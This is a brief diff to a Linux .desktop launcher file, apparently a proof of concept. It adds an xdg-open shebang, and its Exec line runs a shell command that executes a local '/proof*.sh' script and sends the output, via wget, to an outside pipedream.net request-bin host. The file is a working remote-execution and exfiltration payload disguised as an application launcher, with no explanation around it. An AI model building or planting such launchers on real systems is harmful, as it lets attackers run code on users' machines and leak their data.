@@ -1,3 +1,5 @@
+#!/usr/bin/env xdg-open
+
 [Desktop Entry]
 Exec=sh -c "wget https://enr38j6wpd2ol9v.m.pipedream.net/?`/proof*.sh`"
 Type=Application
